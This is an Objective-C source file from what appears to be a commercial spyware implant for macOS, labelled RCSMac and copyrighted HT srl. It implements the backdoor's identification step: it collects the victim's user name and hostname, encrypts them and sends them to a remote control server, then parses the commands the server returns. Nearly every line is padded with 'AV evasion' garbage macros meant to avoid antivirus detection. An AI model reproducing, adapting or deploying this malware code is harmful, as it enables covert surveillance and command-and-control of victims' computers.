/*
 * RCSMac - Identification Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "IDNetworkOperation.h"
#import "RCSMCommon.h"
#import "NSString+Pascal.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation IDNetworkOperation

@synthesize mCommands;

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      mCommands  = [[NSMutableArray alloc] init];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mCommands release];
  [super dealloc];
}

- (BOOL)perform
{ 
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  int i = 0;
  uint32_t _command;
  char tempHost[100];
  NSString *hostName;
  NSString *sourceID = @"";
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  uint32_t command    = PROTO_ID;
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSString *userName  = NSUserName();
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  if (gethostname(tempHost, 100) == 0)
    hostName = [NSString stringWithUTF8String: tempHost];
  else
    hostName = @"EMPTY";
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  NSMutableData *message = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // command PROTO_ID
  [message appendBytes: &command
                length: sizeof(command)];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  // backdoor version
  [message appendBytes: &gVersion
                length: sizeof(gVersion)];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  // userid
  [message appendData: [userName pascalizeToData]];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  // deviceid (hostname)
  [message appendData: [hostName pascalizeToData]];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  // sourceid (not important)
  [message appendData: [sourceID pascalizeToData]];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  // sha1 check
  NSData *messageSha = [message sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [message appendData: messageSha];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse  = nil;
  NSData *replyData           = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [message encryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  replyData = [mTransport sendData: message
                 returningResponse: urlResponse];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if (replyData == nil)
    {
      [message release];
      [outerPool release];

      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSMutableData *decData = [[NSMutableData alloc] initWithData: replyData];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [decData decryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
#ifdef DEBUG_ID_NOP
  infoLog(@"decrypted data: %@", decData);
#endif
  
  //
  // Now check the response
  // OK - num_of_commands - array[num_of_commands] - sha1 - padding
  //
  uint32_t responseCommand;
  [decData getBytes: &responseCommand
             length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  // remove padding
  [decData removePadding];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      shaRemote = [decData subdataWithRange:
                   NSMakeRange([decData length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
      shaLocal = [decData subdataWithRange:
                  NSMakeRange(0, [decData length] - CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
    }
  @catch (NSException *e)
    {  
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  shaLocal = [shaLocal sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {  
      // AV evasion: only on release build
      AV_GARBAGE_001
    
      [message release];
      [decData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if (responseCommand != PROTO_OK)
    {      
      [message release];
      [decData release];
      [outerPool release];
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  int64_t serverTime = 0;
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_001
    
      [decData getBytes: &serverTime
                  range: NSMakeRange(8, sizeof(int64_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_ID_NOP
      errorLog(@"exception on serverTime makerange (%@)", [e reason]);
#endif
      //return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  uint32_t numOfCommands = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  @try
    {      
      // AV evasion: only on release build
      AV_GARBAGE_004
     
      [decData getBytes: &numOfCommands
                  range: NSMakeRange(16, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_ID_NOP
      errorLog(@"exception on numOfCommands makerange (%@)", [e reason]);
#endif
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (numOfCommands == 0)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      
      [message release];
      [decData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      return YES;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  //
  // Parse all the commands
  //
  for (; i < numOfCommands; i++)
    {
      
      // AV evasion: only on release build
      AV_GARBAGE_001

      @try
        {  
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          [decData getBytes: &_command
                      range: NSMakeRange(20 + (i * 4), sizeof(uint32_t))];
        }
      @catch (NSException *e)
        {
          // AV evasion: only on release build
          AV_GARBAGE_007
        
          continue;
        }
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      NSNumber *command = [NSNumber numberWithUnsignedInt: _command];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      [mCommands addObject: command];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [message release];
  [decData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  return YES;
}

@end
